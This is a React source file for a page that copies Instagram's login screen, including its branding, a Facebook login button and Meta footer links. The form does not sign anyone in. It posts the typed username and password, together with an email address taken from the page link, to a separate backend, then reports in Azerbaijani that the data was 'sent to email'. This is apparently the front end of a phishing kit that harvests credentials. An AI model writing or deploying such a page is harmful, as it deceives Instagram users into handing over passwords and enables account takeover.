import { useState, useEffect } from "react";
import img from "./instagram.jpg";
import { useParams, useSearchParams } from "react-router";
import axios from "axios";
import Swal from "sweetalert2";

export default function InstagramLogin() {
  const [currentSlide, setCurrentSlide] = useState(0);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [searchParams] = useSearchParams();
  const email = searchParams.get("email");

  const screenshots = [img];

  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentSlide((prev) => (prev + 1) % screenshots.length);
    }, 3000);

    return () => clearInterval(interval);
  }, [screenshots.length]);

  const handleSubmit = (e) => {
    e.preventDefault();

    if (username && password) {
      const res = axios
        .post("https://localhost:7017/login", {
          fullname: username,
          password,
          email: email || "",
        })
        .then((res) => {
          Swal.fire({
            title: "Uğurlu!",
            text: "Emailə göndərildi!",
            icon: "success",
          });
        })
        .catch((error) => {
          console.error("Xəta baş verdi:", error);
        });
    } else {
      alert("Zəhmət olmasa bütün xanaları doldurun!");
    }
  };

  // Floating items with random animation
  const floatingItems = [
    { emoji: "❤", className: "top-[10%] left-[-10%]", delay: "0s" },
    { emoji: "👍", className: "top-[5%] left-[-5%]", delay: "0.5s" },
    { emoji: "💜", className: "top-[15%] left-[5%]", delay: "1s" },
    { emoji: "⭐", className: "top-[40%] right-[-15%]", delay: "0.3s" },
    { emoji: "✓", className: "top-[20%] right-[-10%]", delay: "0.7s" },
  ];

  return (
    <div className="min-h-screen bg-black text-white flex flex-col justify-center items-center p-5">
      <div className="flex items-center gap-[60px] max-w-[1000px] mx-auto mb-[50px] w-full">
        {/* Left Section - Phone Mockup */}
        <div className="relative hidden lg:block">
          <div className="relative w-[450px] h-[550px]">
            {/* Carousel */}
            <div className="relative w-full h-full rounded-[20px] overflow-hidden">
              {screenshots.map((src, index) => (
                <img
                  key={index}
                  src={src}
                  alt="Instagram Screenshot"
                  className={`absolute top-0 left-0 w-full h-full object-contain rounded-[20px] transition-opacity duration-1000 ${
                    index === currentSlide ? "opacity-100" : "opacity-0"
                  }`}
                />
              ))}
            </div>

            {/* Floating Items */}
            <div className="absolute top-0 left-0 w-full h-full pointer-events-none">
              {floatingItems.map((item, index) => (
                <div
                  key={index}
                  className={`absolute text-[40px] ${item.className} ${
                    item.emoji === "✓"
                      ? "bg-gradient-to-r from-[#ff00ff] to-[#00ffff] bg-clip-text text-transparent"
                      : ""
                  }`}
                  style={{
                    animation: `float ${
                      2 + Math.random() * 2
                    }s ease-in-out infinite`,
                    animationDelay: item.delay,
                  }}
                >
                  {item.emoji}
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* Right Section - Login Form */}
        <div className="w-[350px]">
          <div className="p-10 mb-[10px]">
            <h1
              className="text-center text-[48px] mb-[30px] font-normal"
              style={{ fontFamily: '"Brush Script MT", cursive' }}
            >
              Instagram
            </h1>

            <form className="flex flex-col gap-2 mb-5" onSubmit={handleSubmit}>
              <input
                type="text"
                placeholder="Phone number, username, or email"
                className="bg-[#121212] border border-[#262626] py-[10px] px-[12px] rounded-[3px] text-xs text-white outline-none focus:border-[#555] placeholder-[#737373]"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
              />
              <input
                type="password"
                placeholder="Password"
                className="bg-[#121212] border border-[#262626] py-[10px] px-[12px] rounded-[3px] text-xs text-white outline-none focus:border-[#555] placeholder-[#737373]"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
              <button
                type="submit"
                className="bg-[#0095f6] text-white border-none py-[10px] rounded-lg text-sm font-semibold cursor-pointer mt-[10px] hover:bg-[#0084e0] transition-colors duration-200"
              >
                Log in
              </button>
            </form>

            <div className="flex items-center my-5 text-[#737373] text-[13px] font-semibold">
              <div className="flex-1 h-px bg-[#262626]"></div>
              <span className="px-[18px]">OR</span>
              <div className="flex-1 h-px bg-[#262626]"></div>
            </div>

            <button className="bg-transparent border-none text-[#0095f6] text-sm font-semibold cursor-pointer flex items-center justify-center gap-2 p-[10px] w-full hover:text-[#0084e0] transition-colors duration-200">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="16"
                height="16"
                fill="currentColor"
                viewBox="0 0 16 16"
              >
                <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z" />
              </svg>
              Log in with Facebook
            </button>

            <a
              href="#"
              className="text-center text-[#00376b] text-xs no-underline mt-5 block hover:text-[#003d75]"
            >
              Forgot password?
            </a>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="max-w-[1000px] w-full">
        <div className="flex flex-wrap justify-center gap-[15px] mb-5">
          {[
            "Meta",
            "About",
            "Blog",
            "Jobs",
            "Help",
            "API",
            "Privacy",
            "Terms",
            "Locations",
            "Instagram Lite",
            "Meta AI",
            "Meta AI Articles",
            "Threads",
            "Contact Uploading & Non-Users",
            "Meta Verified",
          ].map((link) => (
            <a
              key={link}
              href="#"
              className="text-[#737373] no-underline text-xs hover:underline"
            >
              {link}
            </a>
          ))}
        </div>
        <div className="flex justify-center items-center gap-5 text-[#737373] text-xs">
          <span>© 2025 Instagram from Meta</span>
        </div>
      </footer>

      <style>{`
        @keyframes float {
          0%, 100% {
            transform: translateY(0px) rotate(0deg);
          }
          50% {
            transform: translateY(-20px) rotate(10deg);
          }
        }
      `}</style>
    </div>
  );
}
// ...existing code...
